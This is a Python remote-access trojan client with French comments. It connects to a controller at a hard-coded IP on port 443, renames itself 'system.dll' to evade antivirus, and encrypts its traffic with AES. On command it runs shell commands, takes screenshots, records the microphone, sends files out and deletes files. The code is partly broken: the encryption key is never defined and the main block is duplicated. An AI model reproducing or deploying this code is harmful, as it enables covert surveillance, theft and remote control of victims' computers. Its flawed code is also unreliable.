import socket
import subprocess
import os
import base64
from Crypto.Cipher import AES
from threading import Thread
import time
import sys

# Entrez ici l'adresse IP de la machine cible et le port que vous souhaitez utiliser pour la connexion
HOST = '192.168.0.2'  
PORT = 443        

# Changement du nom de fichier pour éviter la détection des antivirus
try:
    os.rename(__file__, 'system.dll')
except:
    pass

# Fonction de chiffrement
def encrypt(key, plaintext):
    key = key.encode('utf-8')
    plaintext = plaintext.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC)
    padding = AES.block_size - len(plaintext) % AES.block_size
    padding_char = chr(padding).encode('utf-8')
    plaintext += padding_char * padding
    ciphertext = cipher.encrypt(plaintext)
    return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')

# Fonction de déchiffrement
def decrypt(key, ciphertext):
    key = key.encode('utf-8')
    ciphertext = base64.b64decode(ciphertext.encode('utf-8'))
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    padding_char = plaintext[-1]
    if isinstance(padding_char, int):
        padding_len = padding_char
    else:
        padding_len = ord(padding_char)
    plaintext = plaintext[:-padding_len]
    return plaintext.decode('utf-8')

# Fonction pour envoyer les données chiffrées au serveur
def send_data(data):
    s.send(encrypt(key, data))

# Fonction pour recevoir les données chiffrées du serveur
def receive_data():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode()
            return decrypt(key, data)
        except ValueError:
            continue

# Fonction pour exécuter une commande en arrière-plan
def execute_command(command):
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    send_data(output.stdout.read())
    send_data(output.stderr.read())

# Fonction pour prendre des captures d'écran
def take_screenshot():
    timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
    screenshot_name = f'screenshot_{timestamp}.png'
    subprocess.Popen(f'screencapture {screenshot_name}', shell=True)
    send_file(screenshot_name)

# Fonction pour enregistrer le son du microphone
def record_microphone():
    timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
    audio_name = f'record_{timestamp}.wav'
    subprocess.Popen(f'rec -c 2 {audio_name}', shell=True)
    time.sleep(10) # Enregistrement pendant 10 secondes
    subprocess.Popen(f'killall rec', shell=True)
    send_file(audio_name)

# Fonction pour envoyer un fichier au serveur
def send_file(file_path):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    file_data = base64.b64encode(file_data).decode('utf-8')
    send_data(f'FILE:{os.path.basename(file_path)}:{file_data}')

# Fonction pour supprimer un fichier sur la machine cible
def delete_file(file_path):
    try:
        os.remove(file_path)
        send_data(f"[+] Le fichier {file_path} a été supprimé.")
    except Exception as e:
        send_data(f"[!] Erreur lors de la suppression du fichier {file_path}: {str(e)}")

# Fonction pour télécharger un fichier depuis la machine cible
def download_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        file_data = base64.b64encode(file_data).decode('utf-8')
        send_data(f'DOWNLOAD:{os.path.basename(file_path)}:{file_data}')
    except Exception as e:
        send_data(f"[!] Erreur lors du téléchargement du fichier {file_path}: {str(e)}")


# Fonction principale pour gérer les commandes reçues du serveur
def main():
    while True:
        command = receive_data()
        if command.startswith('CD '):
            # Changement de répertoire
            os.chdir(command[3:])
            send_data(f"[+] Changement de répertoire vers {os.getcwd()}")
        elif command.startswith('DOWNLOAD '):
            # Téléchargement d'un fichier
            download_file(command[9:])
        elif command.startswith('DELETE '):
            # Suppression d'un fichier
            delete_file(command[7:])
        elif command == 'SCREENSHOT':
            # Prise de capture d'écran
            take_screenshot()
        elif command == 'MICROPHONE':
            # Enregistrement audio du microphone
            record_microphone()
        elif command.startswith('EXECUTE '):
            # Exécution d'une commande en arrière-plan
            execute_command(command[8:])
        elif command == 'QUIT':
            # Fermeture de la connexion
            s.close()
            break
        else:
            # Commande inconnue
            send_data('Commande inconnue')

# Lancement de la fonction principale
if __name__ == '__main__':
    # Connexion au serveur distant
    s = socket.socket()

if __name__ == '__main__':
    # Connexion au serveur distant
    s = socket.socket()
    try:
        s.connect((HOST, PORT))
        print('Connecté au serveur')
    except:
        print("Impossible de se connecter au serveur")
        sys.exit()

    # Envoi du nom d'utilisateur au serveur
    username = os.path.expanduser('~').split('\\')[-1]
    send_data(f'Username: {username}')

    # Boucle principale pour recevoir les commandes du serveur et exécuter les fonctions correspondantes
    while True:
        command = receive_data()
        if command.startswith('EXECUTE '):
            command = command.replace('EXECUTE ', '')
            thread = Thread(target=execute_command, args=(command,))
            thread.start()
        elif command == 'SCREENSHOT':
            take_screenshot()
        elif command == 'MICROPHONE':
            record_microphone()
        elif command.startswith('DOWNLOAD '):
            command = command.replace('DOWNLOAD ', '')
            send_file(command)
        elif command == 'EXIT':
            s.close()
            sys.exit()

   

